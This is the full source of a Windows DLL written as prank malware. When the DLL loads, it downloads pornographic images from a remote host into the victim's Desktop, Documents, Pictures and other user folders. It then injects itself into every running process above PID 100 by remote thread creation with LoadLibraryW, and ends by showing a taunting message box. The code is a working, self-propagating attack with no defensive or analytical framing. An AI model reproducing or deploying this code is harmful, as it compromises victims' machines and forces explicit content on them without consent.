// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <Windows.h>
#include <ShlObj.h>
#include <Urlmon.h>
#include <wininet.h>
#include <string>
#include <vector>
#include <regex>

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "wininet.lib")

bool DownloadAndSave(const std::wstring& url, const std::wstring& folder) {
    std::wstring filename = url.substr(url.find_last_of(L"/") + 1);
    std::wstring fullpath = folder + L"\\" + filename;
    return SUCCEEDED(URLDownloadToFileW(NULL, url.c_str(), fullpath.c_str(), 0, NULL));
}

std::vector<std::wstring> ExtractImageUrlsFromIndex(const std::wstring& baseUrl, const std::wstring& htmlContent) {
    std::vector<std::wstring> urls;
    std::wregex pattern(L"href\\s*=\\s*\"([^\"]+\\.(?:jpg|jpeg|png))\"", std::regex::icase);
    std::wsmatch match;
    std::wstring contentW(htmlContent.begin(), htmlContent.end());

    auto begin = contentW.cbegin();
    auto end = contentW.cend();

    while (std::regex_search(begin, end, match, pattern)) {
        std::wstring filename = match[1].str();
        if (filename.find(L"http") == 0) {
            urls.push_back(filename);
        }
        else {
            urls.push_back(baseUrl + filename);
        }
        begin = match.suffix().first;
    }

    return urls;
}

std::wstring DownloadHTML(const wchar_t* url) {
    std::wstring result;
    HINTERNET hInternet = InternetOpenW(L"Parser", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return result;

    HINTERNET hConnect = InternetOpenUrlW(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return result;
    }

    char buffer[4096];
    DWORD bytesRead;
    std::string content;

    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead != 0) {
        content.append(buffer, bytesRead);
    }

    result = std::wstring(content.begin(), content.end());

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return result;
}
#include <TlHelp32.h>

void InjectSelfIntoProcess(DWORD pid, const wchar_t* dllPath) {
    if (pid == GetCurrentProcessId()) return; // Skip self

    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
    if (!hProcess) return;

    void* mem = VirtualAllocEx(hProcess, NULL, (wcslen(dllPath) + 1) * sizeof(wchar_t), MEM_COMMIT, PAGE_READWRITE);
    if (!mem) {
        CloseHandle(hProcess);
        return;
    }

    if (!WriteProcessMemory(hProcess, mem, dllPath, (wcslen(dllPath) + 1) * sizeof(wchar_t), NULL)) {
        VirtualFreeEx(hProcess, mem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW"),
        mem, 0, NULL);

    if (hThread) {
        WaitForSingleObject(hThread, 5000);
        CloseHandle(hThread);
    }

    VirtualFreeEx(hProcess, mem, 0, MEM_RELEASE);
    CloseHandle(hProcess);
}

void InjectIntoAllProcesses(const wchar_t* dllPath) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32W procEntry;
    procEntry.dwSize = sizeof(procEntry);

    if (Process32FirstW(snapshot, &procEntry)) {
        do {
            // Filter out system processes or services by skipping those with PID < 100 (example)
            if (procEntry.th32ProcessID > 100) {
                InjectSelfIntoProcess(procEntry.th32ProcessID, dllPath);
            }
        } while (Process32NextW(snapshot, &procEntry));
    }

    CloseHandle(snapshot);
}

DWORD WINAPI MainThread(LPVOID lpParam) {


    const std::wstring baseFolderUrl = L"http://furryporn.43xhswo030z.xyz/furryporn/";
    std::wstring html = DownloadHTML(baseFolderUrl.c_str());
    std::vector<std::wstring> imageUrls = ExtractImageUrlsFromIndex(baseFolderUrl, html);

    const KNOWNFOLDERID folders[] = {
        FOLDERID_Desktop,
        FOLDERID_Downloads,
        FOLDERID_Documents,
        FOLDERID_Pictures,
        FOLDERID_Music,
        FOLDERID_Videos
    };

    wchar_t* path = nullptr;

    for (const auto& url : imageUrls) {
        for (int j = 0; j < ARRAYSIZE(folders); j++) {
            if (SUCCEEDED(SHGetKnownFolderPath(folders[j], 0, NULL, &path))) {
                DownloadAndSave(url, path);
                CoTaskMemFree(path);
            }
        }
    }

    // Get full DLL path
    wchar_t dllPath[MAX_PATH];
    if (!GetModuleFileNameW((HMODULE)lpParam, dllPath, MAX_PATH)) {
        // fallback, if needed
        GetModuleFileNameW(NULL, dllPath, MAX_PATH);
    }

    InjectIntoAllProcesses(dllPath);

    MessageBoxA(NULL, "just finished downloading 10gb of furry porn onto your computer", "hi", MB_OK | MB_ICONINFORMATION);
    return 0;
}


BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        CreateThread(nullptr, 0, MainThread, hModule, 0, nullptr);
    }
    return TRUE;
}